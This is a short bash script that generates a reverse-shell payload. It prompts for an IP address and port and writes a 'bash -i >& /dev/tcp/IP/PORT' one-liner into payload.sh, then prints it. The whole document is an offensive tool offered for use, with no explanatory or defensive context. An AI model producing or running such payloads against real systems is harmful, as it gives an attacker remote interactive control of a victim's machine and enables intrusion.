#!/bin/bash

echo "Enter your IP address:"
read ip
echo "Enter your port number:"
read port

echo "Generating payload..."
echo "bash -i >& /dev/tcp/$ip/$port 0>&1" > payload.sh

echo "Payload generated:"
cat payload.sh
